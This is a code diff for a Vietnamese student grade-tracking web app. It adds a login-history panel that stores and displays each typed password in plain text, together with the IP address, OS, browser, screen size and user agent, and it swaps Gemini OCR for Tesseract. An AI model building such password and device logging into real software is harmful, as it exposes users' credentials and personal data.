+            const container = document.getElementById('historyListContainer');
+            let logs = [];
+            try {
+                const raw = localStorage.getItem(HISTORY_LOG_KEY);
+                if (raw) logs = JSON.parse(raw);
+            } catch (e) {}
+
+            if (logs.length === 0) {
+                container.innerHTML = `
+                    <div class="text-center py-16 text-slate-400 font-semibold text-xs">
+                        Chưa có lượt đăng nhập nào được ghi nhận trên trình duyệt này.
+                    </div>
+                `;
+                return;
+            }
+
+            container.innerHTML = logs.map(item => {
+                const isOk = item.status.includes('Thành công');
+                return `
+                    <div class="bg-white rounded-xl p-4 border border-slate-200 shadow-sm space-y-2">
+                        <div class="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-2">
+                            <div class="flex items-center gap-2">
+                                <span class="w-2.5 h-2.5 rounded-full ${isOk ? 'bg-emerald-500' : 'bg-red-500'}"></span>
+                                <b class="text-sm text-slate-900">${escapeHtml(item.name)}</b>
+                                <span class="text-[11px] px-2 py-0.5 rounded font-bold ${isOk ? 'bg-emerald-100 text-emerald-800' : 'bg-red-100 text-red-800'}">
+                                    ${item.status}
+                                </span>
+                            </div>
+                            <span class="text-xs text-slate-400 font-mono">${item.timestamp}</span>
+                        </div>
+
+                        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-2 text-xs pt-1">
+                            <div class="bg-slate-50 p-2 rounded border border-slate-100">
+                                <span class="text-slate-400 block text-[10px] font-bold uppercase">Pass đã gõ:</span>
+                                <span class="font-mono font-bold text-rose-700 break-all">${escapeHtml(item.passwordEntered)}</span>
+                            </div>
+                            <div class="bg-slate-50 p-2 rounded border border-slate-100">
+                                <span class="text-slate-400 block text-[10px] font-bold uppercase">Hệ điều hành / Trình duyệt:</span>
+                                <span class="font-bold text-slate-800">${escapeHtml(item.os)} • ${escapeHtml(item.browser)}</span>
+                            </div>
+                            <div class="bg-slate-50 p-2 rounded border border-slate-100">
+                                <span class="text-slate-400 block text-[10px] font-bold uppercase">Độ phân giải màn hình:</span>
+                                <span class="font-bold text-slate-800">${escapeHtml(item.screen)}</span>
+                            </div>
+                            <div class="bg-slate-50 p-2 rounded border border-slate-100">
+                                <span class="text-slate-400 block text-[10px] font-bold uppercase">Địa chỉ IP mạng:</span>
+                                <span class="font-mono font-bold text-nqd-blue">${escapeHtml(item.ip)}</span>
+                            </div>
+                        </div>
+
+                        <div class="text-[10px] text-slate-400 truncate pt-1">
+                            UserAgent: ${escapeHtml(item.rawUA || '')}
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str).replace(/[&<>"']/g, m => ({
+                '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'
+            }[m]));
+        }
+
+        // =========================================================================
+        // LOAD VÀ LƯU TRẠNG THÁI BẢNG ĐIỂM
+        // =========================================================================
         function loadState() {
             try {
                 const raw = localStorage.getItem(STORAGE_KEY);
@@ -580,6 +956,14 @@
                 }
                 const savedLogo = localStorage.getItem(LOGO_KEY);
                 if (savedLogo) applyLogo(savedLogo);
+
+                // Khôi phục phiên làm việc nếu đã đăng nhập trước đó
+                const currentSessionUser = sessionStorage.getItem(AUTH_USER_KEY);
+                if (currentSessionUser) {
+                    document.getElementById('userBadgeDisplay').textContent = `của ${currentSessionUser}`;
+                    loginScreen.classList.add('hidden');
+                    mainAppWrapper.classList.remove('hidden', 'opacity-0');
+                }
             } catch (e) {
                 appState = getDefaultState();
             }
@@ -590,10 +974,6 @@
                 localStorage.setItem(STORAGE_KEY, JSON.stringify(appState));
             } catch (e) {}
         }
-
-        // =========================================================================
-        // 1. ĐIỂM HOẠT ĐỘNG & QUY TẮC NGHỈ (>= 46 BUỔI -> KHÔNG ĐỦ ĐK LÊN LỚP)
-        // =========================================================================
 
         function changeViolation(field, delta) {
             const v = appState.violations;
@@ -627,10 +1007,6 @@
             return '#7f1d1d';
         }
 
-        // =========================================================================
-        // 2. BẢNG NHẬP ĐIỂM THỦ CÔNG 9 MÔN
-        // =========================================================================
-
         function setSubject15Cols(subjectId, val) {
             const num = Math.min(MAX_15P_LIMIT, Math.max(MIN_15P_COLS, parseInt(val) || 4));
             appState.grades[subjectId].num15Cols = num;
@@ -642,7 +1018,7 @@
         function renderTable() {
             const thead = document.getElementById('gradeTableHead');
             const tbody = document.getElementById('gradeTableBody');
-            const maxCols = MAX_15P_LIMIT; // 5 cột
+            const maxCols = MAX_15P_LIMIT;
 
             let s15Headers = '';
             for (let i = 0; i < maxCols; i++) {
@@ -668,7 +1044,7 @@
                 const rowData = appState.grades[sub.id];
                 const active15Cols = Math.min(MAX_15P_LIMIT, Math.max(MIN_15P_COLS, rowData.num15Cols || 4));
                 const tr = document.createElement('tr');
-                tr.className = 'bg-white hover:bg-slate-50/80';
+                tr.className = 'bg-white hover:bg-slate-50/80 transition-colors';
 
                 let s15Cells = '';
                 for (let i = 0; i < maxCols; i++) {
@@ -760,10 +1136,6 @@
             });
         }
 
-        // =========================================================================
-        // 3. TÍNH TOÁN REAL-TIME & BIỂU ĐỒ MIN, MAX, TRUNG BÌNH
-        // =========================================================================
-
         function round1(num) {
             return Math.round((num + Number.EPSILON) * 10) / 10;
         }
@@ -850,7 +1222,7 @@
             const deductUnexcused = unexcusedCount * 25;
             const totalDeduct = deductLate + deductExcused + deductUnexcused;
             const totalAbsent = excusedCount + unexcusedCount;
-            const isOver45Absent = totalAbsent > MAX_TOTAL_ABSENT; // >= 46 buổi
+            const isOver45Absent = totalAbsent > MAX_TOTAL_ABSENT;
             const activityScore = Math.max(0, 1000 - totalDeduct);
             const remainToLose = activityScore - 900;
             const isActivityOk = activityScore >= 900 && !isOver45Absent;
@@ -1082,7 +1454,6 @@
             const y65 = getY(6.5);
             html += `<line x1="${padLeft}" y1="${y65}" x2="${width - padRight}" y2="${y65}" stroke="#f43f5e" stroke-width="1" stroke-dasharray="3,3" />`;
 
-            // Đường & Chấm Trung bình
             if (gpaVal !== null) {
                 const yAvg = getY(gpaVal);
                 const xMid = padLeft + plotW / 2;
@@ -1163,19 +1534,11 @@
         }
 
         // =========================================================================
-        // 4. QUÉT TỐI ĐA 3 ẢNH VIETSCHOOL
+        // OCR VIETSCHOOL & SỰ KIỆN GIAO DIỆN
         // =========================================================================
-
         function normalizeVi(str) {
             if (!str) return '';
-            return String(str)
-                .toLowerCase()
-                .normalize('NFD')
-                .replace(/[\u0300-\u036f]/g, '')
-                .replace(/đ/g, 'd')
-                .replace(/[^a-z0-9\s]/g, ' ')
-                .replace(/\s+/g, ' ')
-                .trim();
+            return String(str).toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/đ/g, 'd').replace(/[^a-z0-9\s]/g, ' ').replace(/\s+/g, ' ').trim();
         }
 
         function mapDetectedSubjectToId(rawName) {
@@ -1265,29 +1628,6 @@
             if (descText) document.getElementById('ocrStatusDesc').textContent = descText;
         }
 
-        async function callGeminiVisionBatchOcr(imagesPayload) {
-            const apiKey = "";
-            const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent?key=${apiKey}`;
-            const parts = [
-                { text: "Trích xuất điểm tất cả các môn học từ các ảnh chụp màn hình app Vietschool này thành 1 mảng JSON hợp nhất gồm: subjectName (nếu khuất tên đặt là UNKNOWN), s15 (mảng điểm 15p), totalCols15 (2 đến 5), gk (giữa kì), ck (cuối kì)." }
-            ];
-            imagesPayload.forEach(img => {
-                parts.push({ inlineData: { mimeType: img.mimeType || "image/jpeg", data: img.base64 } });
-            });
-            const payload = {
-                contents: [{ role: "user", parts }],
-                generationConfig: { responseMimeType: "application/json" }
-            };
-            const res = await fetch(apiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            if (!res.ok) throw new Error('API Error');
-            const data = await res.json();
-            return JSON.parse(data?.candidates?.[0]?.content?.parts?.[0]?.text || '[]');
-        }
-
         function readFileAsDataUrl(file) {
             return new Promise((resolve, reject) => {
                 const reader = new FileReader();
@@ -1322,28 +1662,18 @@
                     thumbsContainer.appendChild(imgEl);
                 });
 
-                updateAiProgressBar(50, `AI đang phân tích ${files.length} ảnh cùng lúc...`, 'Đang nhận diện các môn học và điểm số...');
-
-                const imagesPayload = loadedImages.map(item => ({
-                    base64: item.dataUrl.split(',')[1],
-                    mimeType: item.mimeType,
-                    dataUrl: item.dataUrl
-                }));
+                updateAiProgressBar(50, `Đang phân tích ${files.length} ảnh cùng lúc...`, 'Đang bóc tách điểm số...');
 
                 let combinedList = [];
-                try {
-                    combinedList = await callGeminiVisionBatchOcr(imagesPayload);
-                } catch (err) {
-                    if (typeof Tesseract !== 'undefined') {
-                        const worker = await Tesseract.createWorker('vie+eng');
-                        for (let i = 0; i < imagesPayload.length; i++) {
-                            updateAiProgressBar(55 + Math.round(((i + 1) / imagesPayload.length) * 35), `Đang quét OCR ảnh ${i + 1}/${imagesPayload.length}...`, 'Đang bóc tách điểm số...');
-                            const ret = await worker.recognize(imagesPayload[i].dataUrl);
-                            const parsed = parseFallbackOcrText(ret?.data?.text || '');
-                            combinedList.push(...parsed);
-                        }
-                        await worker.terminate();
+                if (typeof Tesseract !== 'undefined') {
+                    const worker = await Tesseract.createWorker('vie+eng');
+                    for (let i = 0; i < loadedImages.length; i++) {
+                        updateAiProgressBar(55 + Math.round(((i + 1) / loadedImages.length) * 35), `Đang quét OCR ảnh ${i + 1}/${loadedImages.length}...`, 'Đang đọc dữ liệu chữ và số...');
+                        const ret = await worker.recognize(loadedImages[i].dataUrl);
+                        const parsed = parseFallbackOcrText(ret?.data?.text || '');
+                        combinedList.push(...parsed);
                     }
+                    await worker.terminate();
                 }
 
                 const filled = applyRecognizedGrades(combinedList);
@@ -1383,17 +1713,13 @@
             return results;
         }
 
-        // =========================================================================
-        // 5. GẮN SỰ KIỆN TOÀN DIỆN (ĐẢM BẢO TƯƠNG TÁC 100%)
-        // =========================================================================
-
         function showToast(msg) {
             const box = document.getElementById('toastBox');
             const item = document.createElement('div');
-            item.className = 'bg-slate-900 text-white text-xs font-semibold px-3.5 py-2 rounded-lg shadow-lg';
+            item.className = 'bg-slate-900 text-white text-xs font-semibold px-3.5 py-2.5 rounded-xl shadow-2xl transition-all duration-300';
             item.textContent = msg;
             box.appendChild(item);
-            setTimeout(() => item.remove(), 2200);
+            setTimeout(() => item.remove(), 2500);
         }
 
         function applyLogo(dataUrl) {
